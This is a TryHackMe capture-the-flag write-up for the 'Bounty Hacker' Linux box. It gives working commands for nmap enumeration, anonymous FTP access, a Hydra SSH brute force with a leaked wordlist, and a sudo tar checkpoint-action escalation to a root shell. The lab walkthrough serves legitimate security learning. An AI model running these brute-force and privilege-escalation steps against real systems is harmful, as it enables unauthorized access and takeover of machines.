# Bounty Hacker - TryHackMe Writeup

## Overview

Bounty Hacker is a beginner-friendly Linux machine focused on enumeration, credential discovery, brute forcing, and privilege escalation through a misconfigured sudo permission.

**Difficulty:** Easy

**Topics:**
- FTP Enumeration
- Hydra Brute Force
- SSH Access
- Linux Privilege Escalation
- GTFOBins

- ## Attack Path

1. Nmap Enumeration
2. Anonymous FTP Access
3. Credential Discovery
4. SSH Brute Force
5. User Access
6. Sudo Enumeration
7. Privilege Escalation via tar
8. Root Access


## Tools Used

- Nmap
- FTP
- Hydra
- SSH
- GTFOBins

  
---

## Nmap Scan

The first step was performing a service enumeration scan.

```bash
nmap -sC -sV <TARGET_IP>
```

The scan revealed three interesting services:

```text
21/tcp open  ftp  vsftpd 3.0.5
22/tcp open  ssh  OpenSSH 8.2p1
80/tcp open  http Apache 2.4.41
```

Most importantly, anonymous FTP access was enabled.

### Nmap Results

<img width="730" height="433" alt="nmap" src="https://github.com/user-attachments/assets/57cd4f15-79bc-4d8e-b112-d9911e13f850" />


---

## Anonymous FTP Access

Since anonymous login was allowed, I connected to the FTP service.

```bash
ftp <TARGET_IP>
```

Login:

```text
Username: anonymous
```

After listing the available files, two interesting files were discovered:

```text
locks.txt
task.txt
```

Both files were downloaded.

```bash
get locks.txt
get task.txt
```

### FTP Enumeration

<img width="752" height="585" alt="ftp" src="https://github.com/user-attachments/assets/b74603ab-da1a-45b7-8ff1-29c29e335c96" />


---

## Credential Discovery

After reviewing the downloaded files:

* `task.txt` revealed the username `lin`
* `locks.txt` contained a list of potential passwords

This suggested a password brute force attack against SSH.

---

## SSH Brute Force

Using Hydra, I tested the passwords contained in `locks.txt` against the SSH service.

```bash
hydra -l lin -P locks.txt ssh://<TARGET_IP>
```

Hydra successfully identified the password:

```text
Red*****
```

---

## Initial Access

Using the recovered credentials, I connected via SSH.

```bash
ssh lin@<TARGET_IP>
```

After logging in, I obtained the user flag:

```bash
cat ~/Desktop/user.txt
```

```text
THM{C***********}
```

### User Access

<img width="752" height="585" alt="ssh2" src="https://github.com/user-attachments/assets/8110ffa4-fabb-4586-bce5-e77af9699e0c" />


---

## Privilege Escalation

To identify possible privilege escalation vectors, I checked sudo permissions.

```bash
sudo -l
```

Output:

```text
User lin may run the following commands:
    (root) /bin/tar
```

The `tar` binary is listed on GTFOBins and can be abused to spawn a root shell when executed through sudo.

```bash
sudo tar -cf /dev/null /dev/null \
--checkpoint=1 \
--checkpoint-action=exec=/bin/sh
```

After execution:

```bash
whoami
```

Output:

```text
root
```

---

## Root Flag

Once root access was obtained:

```bash
cd /root
cat root.txt
```

Flag:

```text
THM{8*********}
```

---

## Conclusion

This machine demonstrated a straightforward attack path:

1. Enumerate services with Nmap
2. Identify anonymous FTP access
3. Download exposed files
4. Extract a username and password wordlist
5. Brute force SSH credentials
6. Enumerate sudo permissions
7. Abuse `tar` via GTFOBins to obtain root access

The box is beginner-friendly and provides a good introduction to Linux privilege escalation through misconfigured sudo permissions.

## Lessons Learned

- Always check for anonymous FTP access.
- Publicly accessible files may expose credentials or usernames.
- SSH brute forcing becomes practical when a valid username and targeted wordlist are available.
- Running `sudo -l` should be one of the first actions after gaining a shell.
- GTFOBins is an essential resource for Linux privilege escalation.
```
